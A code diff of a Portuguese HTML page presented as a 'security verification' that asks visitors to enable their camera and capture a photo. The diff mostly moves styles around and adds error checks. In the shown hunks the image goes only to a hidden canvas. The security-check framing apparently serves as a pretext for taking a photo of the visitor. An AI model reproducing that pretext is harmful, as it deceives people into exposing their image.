@@ -1,54 +1,100 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificação de Segurança</title>
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 16px;
+            text-align: center;
+            max-width: 400px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+        }
+
+        .logo {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            color: white;
+            font-size: 36px;
+        }
+
+        .status {
+            color: #666;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+
+        button {
+            margin-top: 15px;
+            padding: 12px 20px;
+            border: none;
+            border-radius: 8px;
+            background: #667eea;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        button:last-of-type {
+            background: #764ba2;
+        }
+
+        #video {
+            display: none;
+            width: 300px;
+            margin-top: 20px;
+            border-radius: 8px;
+        }
+    </style>
+</head>
+
+<body>
+
 <div class="container">
     <div class="logo">🔒</div>
     <h2>Verificação de Segurança</h2>
 
-    <p style="color: #888; font-size: 13px; margin: 10px 0;">
+    <p style="color: #888; font-size: 13px;">
         Seu dispositivo está sendo verificado para garantir acesso seguro.
     </p>
 
     <p class="status" id="status">Clique para permitir a câmera.</p>
 
-    <button onclick="pedirCamera()" style="
-        margin-top: 20px;
-        padding: 12px 20px;
-        border: none;
-        border-radius: 8px;
-        background: #667eea;
-        color: white;
-        font-weight: bold;
-        cursor: pointer;
-    ">
-        Permitir câmera
-    </button>
+    <button onclick="pedirCamera()">Permitir câmera</button>
 
-    <button onclick="capturarFoto()" style="
-        margin-top: 10px;
-        padding: 12px 20px;
-        border: none;
-        border-radius: 8px;
-        background: #764ba2;
-        color: white;
-        font-weight: bold;
-        cursor: pointer;
-    ">
-        Capturar foto
-    </button>
+    <button onclick="capturarFoto()">Capturar foto</button>
 
-    <video id="video" autoplay playsinline style="
-        display: none;
-        width: 300px;
-        margin-top: 20px;
-        border-radius: 8px;
-    "></video>
+    <video id="video" autoplay playsinline></video>
 
     <canvas id="canvas" style="display:none;"></canvas>
 </div>
 
 <script>
-  <script>
 const video = document.getElementById('video');
 const status = document.getElementById('status');
 const canvas = document.getElementById('canvas');
+
+let streamGlobal = null;
 
 async function pedirCamera() {
     try {
@@ -59,17 +105,25 @@ async function pedirCamera() {
             audio: false
         });
 
+        streamGlobal = stream;
+
         video.srcObject = stream;
         video.style.display = 'block';
 
         status.textContent = 'Câmera permitida com sucesso ✅';
     } catch (err) {
+        console.error(err);
         status.textContent = 'Permissão da câmera negada ou indisponível ❌';
         alert('Erro: ' + err.name + ' - ' + err.message);
     }
 }
 
 function capturarFoto() {
+    if (!streamGlobal) {
+        alert("Primeiro permita a câmera ⚠️");
+        return;
+    }
+
     const ctx = canvas.getContext('2d');
 
     canvas.width = video.videoWidth;
@@ -86,7 +140,6 @@ function capturarFoto() {
 
     status.textContent = 'Foto capturada com sucesso ✅';
 }
-</script>
 </script>
 
 </body>
